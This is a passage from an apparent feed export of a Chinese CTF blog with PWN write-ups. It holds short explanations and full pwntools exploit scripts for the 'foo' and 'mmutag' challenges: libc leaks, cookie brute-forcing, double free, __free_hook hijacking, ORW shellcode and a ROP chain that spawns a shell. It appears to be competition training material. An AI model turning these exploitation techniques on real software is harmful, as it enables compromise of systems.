class="number">-0x10</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0xF7</span>),<span class="number">-0x10</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x67</span>),<span class="number">-0x10</span>+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">-0x10</span>+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">-0x10</span>+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">-0x10</span>+<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0xb0</span><span class="number">-8</span>),<span class="number">0x98</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0xF7</span>),<span class="number">0x98</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x67</span>),<span class="number">0x98</span>+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">0x98</span>+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">0x98</span>+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">0x98</span>+<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0xb0</span><span class="number">-0x38</span>),<span class="number">0xe8</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0xF8</span>),<span class="number">0xe8</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x67</span>),<span class="number">0xe8</span>+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">0xe8</span>+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">0xe8</span>+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0x100</span>),<span class="number">0xe8</span>+<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(one_gadget&amp;<span class="number">0xff</span>),<span class="number">0x100</span>+<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>),<span class="number">0x100</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>),<span class="number">0x100</span>+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>),<span class="number">0x100</span>+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xff</span>),<span class="number">0x100</span>+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">40</span>)&amp;<span class="number">0xff</span>),<span class="number">0x100</span>+<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b fprintf\n b system\n b *0x406860')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit"</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="foo"><a href="#foo" class="headerlink" title="foo"></a>foo</h3><p>用seccomp初始化沙盒，所以堆上会残留信息，以此来leak出libc地址。</p><p>接着逐位爆破cookie。</p><p>然后利用malloc_consolidate机制，将0x40的堆块合并到topchunk中，再进行guess申请到该地址，并将0x28偏移处改为cookie，即可构成double free。</p><p>继续操作将该堆块合并进top chunk中，接着再依次进行申请堆块以及guess即可写fd，通过此操作劫持<code>__free_hook</code>。</p><p>将<code>__free_hook</code>修改为printf即可用格式化字符串来进行leak操作。</p><p>操作完毕后0x190的tcache中会存在两个相邻的0x40的堆块，通过guess溢出第二个堆块到第一个堆块的fd，将其修改为页对齐的地址。接着申请到该地址到idx为7处，并修改<code>__free_hook</code>为mprotect。接着free(7)，即会将该地址设置为可读写操作。</p><p>最后将<code>__free_hook</code>为下一申请到的0x190的堆块地址，并用guess在此堆块上写入shellcode进行orw。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process("./foo",env = &#123;"LD_PRELOAD":"./libc.so"&#125;)</span></span><br><span class="line">p = remote(<span class="string">"39.105.35.195"</span>,<span class="string">"13452"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"5"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Want the cookie? "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">p.sendline(<span class="string">"1"</span>*<span class="number">0x800</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3EBCD0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">libc.address =libc_base</span><br><span class="line"><span class="comment">#try cookie</span></span><br><span class="line">cookie = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(i)[<span class="number">0</span>])</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">s = p.recvuntil(<span class="string">"6. exit"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Content: '</span> <span class="keyword">in</span> s:</span><br><span class="line">cookie += i</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> hex(cookie)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x100</span>):</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(i*<span class="number">0x100</span>+cookie)[:<span class="number">2</span>])</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">s = p.recvuntil(<span class="string">"6. exit"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Content: '</span> <span class="keyword">in</span> s:</span><br><span class="line">cookie += i*<span class="number">0x100</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> hex(cookie)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x100</span>):</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(i*<span class="number">0x10000</span>+cookie)[:<span class="number">3</span>])</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">s = p.recvuntil(<span class="string">"6. exit"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Content: '</span> <span class="keyword">in</span> s:</span><br><span class="line">cookie += i*<span class="number">0x10000</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> hex(cookie)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x100</span>):</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(i*<span class="number">0x1000000</span>+cookie)[:<span class="number">4</span>])</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">s = p.recvuntil(<span class="string">"6. exit"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Content: '</span> <span class="keyword">in</span> s:</span><br><span class="line">cookie += i*<span class="number">0x1000000</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> hex(cookie)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">add(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(<span class="number">6</span>-i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">p.sendline(<span class="string">"1"</span>*<span class="number">0x800</span>)</span><br><span class="line">guess(<span class="string">'\x00'</span>*<span class="number">0x28</span>+p32(cookie))</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">add(i)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">guess(<span class="string">'\x00'</span>*<span class="number">0x28</span>+p32(cookie))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#leak pie stack</span></span><br><span class="line">edit(<span class="number">0</span>,p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc.sym[<span class="string">'printf'</span>]))<span class="comment">#0x3EFD0</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'%p%14$p'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">pie = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-0xFCF</span></span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">stack = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"><span class="keyword">print</span> hex(pie)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">guess(<span class="string">'\x00'</span>*<span class="number">0x28</span>+p32(cookie))</span><br><span class="line">guess(p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x41</span>)+p64((heap&amp;<span class="number">0xffffffffff000</span>)))</span><br><span class="line">add(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc.sym[<span class="string">'mprotect'</span>]))</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x180</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p,'b free')</span></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">mov rdi,'''</span>+str(heap+<span class="number">0x180</span>+<span class="number">0x100</span>)+<span class="string">'''</span></span><br><span class="line"><span class="string">mov rsi,0</span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rsi,'''</span>+str(heap+<span class="number">0x180</span>+<span class="number">0x200</span>)+<span class="string">'''</span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">mov rsi,'''</span>+str(heap+<span class="number">0x180</span>+<span class="number">0x200</span>)+<span class="string">'''</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">shellcode = asm(shellcode,arch=<span class="string">'amd64'</span>)</span><br><span class="line">guess(shellcode.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)+<span class="string">'flag\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h2&gt;&lt;h3 id=&quot;logger&quot;&gt;&lt;a href=&quot;#logger&quot; class=&quot;headerlink&quot; title=&quot;logger&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2020西湖论剑线上初赛-WP</title>
    <link href="https://nuoye-blog.github.io/2020/10/25/e669e7b9/"/>
    <id>https://nuoye-blog.github.io/2020/10/25/e669e7b9/</id>
    <published>2020-10-25T14:00:00.000Z</published>
    <updated>2020-10-25T13:58:02.327Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="mmutag"><a href="#mmutag" class="headerlink" title="mmutag"></a>mmutag</h3><p>最开始会给出栈地址，存在uaf漏洞，并且这里存在栈漏洞：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20201025210657.png" alt="image-20201025210650080"></p><p>可以泄漏出canary。</p><p>利用uaf申请到栈上，即可劫持返回地址进行rop操作，leak出libc的地址即可用system进行getshell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./mmutag"</span>)</span><br><span class="line">p = remote(<span class="string">"183.129.189.62"</span>,<span class="number">60104</span>)</span><br><span class="line">libc = ELF(<span class="string">"mmutag"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_i</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"please input your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please input your introduce '</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choise:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please input your id:'</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">'input your content'</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choise:'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please input your id:'</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choise:'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit1</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choise:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"please input you name:"</span>)</span><br><span class="line">p.send(<span class="string">"aaa"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">stack = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"please input your choice:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="string">'b'</span>*<span class="number">0x19</span>)</span><br><span class="line">p.recvuntil(<span class="string">"b"</span>*<span class="number">0x18</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>))<span class="number">-0x62</span></span><br><span class="line"><span class="keyword">print</span> hex(canary)</span><br><span class="line">show(p64(<span class="number">0</span>)+p64(<span class="number">0x7f</span>)+p64(<span class="number">0</span>)+p64(canary))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,p64(stack <span class="number">-0x40</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">puts_plt = <span class="number">0x4006B0</span></span><br><span class="line">puts_got = <span class="number">0x602020</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400d23</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400d21</span></span><br><span class="line">read_plt = <span class="number">0x4006F0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(canary)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x400D1A</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(stack+<span class="number">0x28</span>)</span><br><span class="line">payload += p64(<span class="number">0x200</span>)</span><br><span class="line">payload += p64(stack +<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x400D00</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line">add(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exit1()</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x400D1A</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(stack+<span class="number">0x78</span>)</span><br><span class="line">payload += p64(<span class="number">0x200</span>)</span><br><span class="line">payload += p64(stack+<span class="number">0x70</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x400D00</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400D1A')</span></span><br><span class="line">p.send(payload)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">p.send(p64(pop_rdi)+p64(libc.search(<span class="string">"/bin/sh"</span>).next())+p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h3><p>套了web的堆题，存在uaf漏洞。</p><p>结合unsortbin进行io_leak，接着修改<code>__free_hook</code>为<code>setcontext</code>，利用<code>sys_rt_sigprocmask</code>系统调用劫持程序流程，从而进行orw读取flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 